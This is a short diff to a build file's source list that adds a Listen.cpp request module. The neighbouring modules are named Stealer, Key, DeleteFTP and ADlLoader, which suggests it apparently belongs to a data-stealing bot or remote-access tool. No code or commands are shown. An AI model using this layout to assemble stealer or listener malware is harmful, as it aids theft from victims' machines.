@@ -32,6 +32,7 @@ SRCS		+=	core/request/SQL.cpp
 SRCS		+=	core/request/Key.cpp
 SRCS		+=	core/request/Reload.cpp
 SRCS		+=	core/request/Close.cpp
+SRCS		+=	core/request/Listen.cpp
 SRCS		+=	core/request/Stealer.cpp
 SRCS		+=	core/request/DeleteFTP.cpp
 SRCS		+=	utils/ADlLoader.cpp
